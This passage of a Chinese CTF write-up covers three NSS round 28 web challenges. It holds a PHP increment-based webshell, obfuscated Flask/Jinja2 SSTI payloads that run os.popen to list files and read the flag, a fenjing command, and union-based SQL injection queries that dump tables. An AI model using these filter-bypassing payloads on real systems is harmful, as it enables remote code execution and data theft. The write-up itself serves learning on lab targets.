那显然只能打自增\n自增规则简单，比如$a=\u0026lsquo;A\u0026rsquo;;$a++=\u0026lsquo;B\u0026rsquo;,所以只要一个字母A,我就可以构造一个$_GET,这样就可以给 _ 还有__赋值（这里有数字，但是还是用_,因为我这个照着无数字字母rce打，相当于通用payload），从而到达命令执行的目的,那这个A怎么的得到?\n在php中，数组与字符串连接，会被转换成字符串，值就是Array,那就相对于拿到了所有字母\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $_=[].\u0026#39;\u0026#39;;//Array $_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];//A $_++;//B $_++;//C $_++;//D $_++;//E $__=$_;//E $_++;//F $_++;//G $___=$_;//G $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T $_=$___.$__.$_;//GET //var_dump($_); $_=\u0026#39;_\u0026#39;.$_;//_GET var_dump($$_[_]($$_[__])); //$_GET[_]($_GET[__]) 接下来就可以尝试去给_和__GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样\n1 $_=[].\u0026#39;\u0026#39;;$_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=\u0026#39;_\u0026#39;.$_;$$_[_]($$_[__]); 然后是\n1 %24_%3D%5B%5D.\u0026#39;\u0026#39;%3B%24_%3D%24_%5B\u0026#39;\u0026#39;%3D%3D\u0026#39;%24\u0026#39;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D\u0026#39;_\u0026#39;.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B 但是这个paylaod不行，因为限制了字符，还是要利用数字，所以应该打$_GET[1] ($_GET[2])\n1 2 3 4 5 6 7 8 9 $_=[]._;//Array $__=$_[1];//r $_=$_[0];//A $_++;//B $_1=++$_;//$_1=C,$_=D(这里是前缀++，即先自增一再赋值) $_++;$_++;$_++;$_++;//$_=H $_=$_1.++$_.$__;//CHr $_=_.$_(71).$_(69).$_(84);//_GET $$_[1]($$_[2]); //$_GET[1]$_GET[2] 1 %24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B%20 这里是118个字符，比较极限，下面更好，只有111字符\n1 2 3 4 5 6 7 8 9 10 11 12 $_=([]._){0}; //A $_++; $_1=++$_; //$_1=C $_++; $_++; $_++; $_++; $_1.=++$_.([]._){1}; //$_1=CHr $_=_.$_1(71).$_1(69).$_1(84); //$_=_GET $$_[1]($$_[2]); //$_GET[1]($_GET[2]) //缩短为一行 $_=([]._){0};$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_1.=++$_.([]._){1};$_=_.$_1(71).$_1(69).$_1(84);$$_[1]($$_[2]); [从CTFShowRCE挑战]中学习自增构造webshell-腾讯云开发者社区-腾讯云\n对于RCE和文件包含的一点总结 | root@wanth3f1ag\n[HNCTF] challenge_rce - Boogiepop Doesn\u0026rsquo;t Laugh\nCoding Loving-ssti 有源码先审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from flask import Flask, request, render_template, session, url_for app = Flask(__name__) app.secret_key = \u0026#39;Ciallo～(∠・ω ＜）⌒★\u0026#39; # 设置应用密钥，用于会话加密 # 定义过滤关键词列表 FILTER_KEYWORDS = [\u0026#39;Ciallo～(∠・ω ＜）⌒★\u0026#39;] TIME_LIMIT = 1 # 时间限制，未在代码中使用 # 定义函数，检查输入中是否包含禁止的关键词 def contains_forbidden_keywords(complaint): for keyword in FILTER_KEYWORDS: if keyword.lower() in complaint: # 检查关键词是否在输入中（不区分大小写） return True return False @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # 定义路由 \u0026#39;/\u0026#39;，支持 GET 和 POST 方法 def index(): session[\u0026#39;user\u0026#39;] = \u0026#39;test\u0026#39; # 设置会话中的用户为 \u0026#39;test\u0026#39; command = request.form.get(\u0026#39;cmd\u0026#39;, \u0026#39;coding\u0026#39;) # 获取表单中的 \u0026#39;cmd\u0026#39; 值，默认为 \u0026#39;coding\u0026#39; return render_template(\u0026#39;index.html\u0026#39;, command=command) # 渲染 index.html 模板，传递 command 参数 @app.route(\u0026#39;/test\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # 定义路由 \u0026#39;/test\u0026#39;，支持 GET 和 POST 方法 def shell(): if session.get(\u0026#39;user\u0026#39;) != \u0026#39;test\u0026#39;: # 检查会话中的用户是否为 \u0026#39;test\u0026#39; return render_template(\u0026#39;Auth.html\u0026#39;) # 如果不是，渲染 Auth.html 模板（可能是登录页面） if (abc := request.headers.get(\u0026#39;User-Agent\u0026#39;)) is None: # 获取 User-Agent 头，如果不存在 return render_template(\u0026#39;Auth.html\u0026#39;) # 返回 Auth.html 模板 cmd = request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;试一试\u0026#39;) # 获取 URL 参数中的 \u0026#39;cmd\u0026#39; 值，默认为 \u0026#39;试一试\u0026#39; if request.method == \u0026#39;POST\u0026#39;: # 如果是 POST 请求 css_url = url_for(\u0026#39;static\u0026#39;, filename=\u0026#39;style.css\u0026#39;) # 生成静态文件 style.css 的 URL command = request.form.get(\u0026#39;cmd\u0026#39;) # 获取表单中的 \u0026#39;cmd\u0026#39; 值 if contains_forbidden_keywords(command): # 检查命令中是否包含禁止的关键词 return render_template(\u0026#39;forbidden.html\u0026#39;) # 如果包含，渲染 forbidden.html 模板 # 使用 render_template_string 渲染一个 HTML 字符串，传递 command 和 css_url 参数 return render_template_string(f\u0026#39;\u0026#39;\u0026#39; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Loving Music\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{css_url}\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;\u0026lt;url id=\u0026#34;cvh0d9sc75rev485mjl0\u0026#34; type=\u0026#34;url\u0026#34; status=\u0026#34;failed\u0026#34; title=\u0026#34;\u0026#34; wc=\u0026#34;0\u0026#34;\u0026gt;https://fonts.googleapis.com/css2?family=Poppins:wght@400\u0026lt;/url\u0026gt; ;600\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Loving coding\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;emoji\u0026#34;\u0026gt;🧑‍💻\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{command}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39;, command=command, css_url=css_url) return render_template(\u0026#39;shell.html\u0026#39;, command=cmd) # 如果是 GET 请求，渲染 shell.html 模板，传递 cmd 参数 显然这里漏洞点在render_template_string ，这个与ssti密不可分（render_template_string函数在渲染模板的时候使用了%s来动态的替换字符串，在渲染的时候会把 {undefined{**}} 包裹的内容当做变量解析替换。）\nFlask的渲染方法函数\u0026mdash;render_template()/render_template_string()-CSDN博客\n所以就是打ssti(在/test路由，cmd是参数)，先fuzz一下，这些都是没过滤的\n下面是过滤的（下面还一些关键词，那些无所谓，直接引号绕过了），显然，困难的是数字，下划线过滤了，因为下划线过滤了，一般用request加attr，或者编码，但是数字和点过滤了，这让我束手无策。\n那就直接fenjing跑！\n一开始我直接跑fenjing跑不出，一般默认跑fenjing基本跑不出，要根据题目加点参数才行。这个fenjing跑要带路由，cookie，不然跑不出。这里我猜猜原因，这里设置了seesion会话用户是test，后面还进行了验证，所以要带上seesion才行。\nfenjing如果你是pip下载就打\n1 fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST 不然就命令行前加pyhton -m就行\n1 python -m fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST 然后执行命令就行\n这里给出payload：ls\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x)|count)*(x,x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} cat /flag\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x,x,x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),(((x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count)*(x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} 总结，fenjing还是很强，以前不会用，以后注意一定要带上参数\nlight_pink-sql 这题是考sql，但是有非预期\n非预期 拿dirsearch扫一下\n1 python dirsearch.py -u http://node6.anna.nssctf.cn:23588/ db.php没有东西，但是shell.php有好东西\n直接有eval了，我这可以直接打一句话木马了！\n但是！这里有phpinfo!,所以我猜测一下可能会有flag，直接搜flag或者nss，发现flag在环境变量\n预期解 预期解显然就是打sql\n先打1'#%23(%23就是#，\u0026ndash;+被过滤了)\n然后试1' order by 5%23(试到6报错)\n然后看看哪有回显，但是报错，原因是-被禁用\n果然-被禁，结果是4是回显\n1 0\u0026#39; union select 1,2,3,4,5%23 接下来找表\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema=database()%23 显示不可以哦=，所以应该是**=被过滤，用like代替**\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like database()%23 查列\n1 0\u0026#39; union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_name like \u0026#39;Cute\u0026#39;%23 查flag\n1 0\u0026#39; union select 1,2,3,group_concat(Happy),5 from Cute%23 此题过滤了-还有=,但是还是比较友好，毕竟报错还是有提示，是一个不错的sql题\n","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/nss-round28-web/","title":"nss-round28-web"}]